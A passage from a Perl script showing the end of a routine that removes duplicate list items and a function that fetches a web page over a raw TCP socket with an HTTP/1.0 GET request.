next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp", Timeout=>"5") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}}

